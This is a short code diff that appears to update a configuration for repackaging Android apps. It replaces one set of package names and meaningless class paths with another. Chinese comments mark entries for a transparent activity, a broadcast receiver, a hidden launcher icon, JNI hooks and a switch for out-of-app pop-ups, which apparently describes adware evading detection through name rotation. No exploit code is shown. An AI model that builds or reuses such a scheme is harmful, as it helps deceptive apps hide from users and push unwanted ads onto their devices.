@@ -1,18 +1,18 @@
-swc ['com.show.biker.fasten', 'com.bikeracer.quadrush.bike',  # 包名
-               'com.bamboo.cane.shoes.horses.xac.XzShowActivity',# 透明activity
-               'com/bamboo/cane/shoes/horses/ywc/ysr/YwcMRecent',  #  广播
-               '', 'com.show.biker.fasten.GuideActivity',  # 隐藏图标 other1","main2
-               'com/bamboo/cane/shoes/horses/bmain/SwcTool', '"swcTool"',# jni路径及函数
-              '/scwc']  # 外弹文件开关名
+swccs ['com.cango.cat.biker', 'com.rushbike.kepasducar',  # 包名
+               'com.river.flows.eastward.waves.csxac.XzcsShowActivity',# 透明activity
+               'com/river/flows/eastward/waves/csywc/ysr/YwccsMRecent',  #  广播
+               '', 'com.cango.cat.biker.GuideActivity',  # 隐藏图标 other1","main2
+               'com/river/flows/eastward/waves/bmain/SwccsTool', '"swccsTool"',# jni路径及函数
+              '/scwccs']  # 外弹文件开关名
 
 
 
 
 
 
-nscwc ['com.show.biker.fasten', 'com.bikeracer.quadrush.bike',  # 包名
-                'com/bamboo/cane/shoes/horses/zytw/ZytwA’,
-                '"Mgkei"','"Agkggh"', '"Ugjrru"',
-                'com/bamboo/cane/shoes/horses/zytw/ZytwF',  # hander
-                'com/bamboo/cane/shoes/horses/zytw/ZytwW',  # WccClass
-                '/scwc']#文件开关
+nscwccs ['com.cango.cat.biker', 'com.rushbike.kepasducar',  # 包名
+                'com/river/flows/eastward/waves/cszytw/ZycstwA’,
+                '"Mgcskei"','"Agcskggh"', '"Ugcsjrru"',
+                'com/river/flows/eastward/waves/cszytw/ZycstwF',  # hander
+                'com/river/flows/eastward/waves/cszytw/ZycstwW',  # WccClass
+                '/scwccs']#文件开关
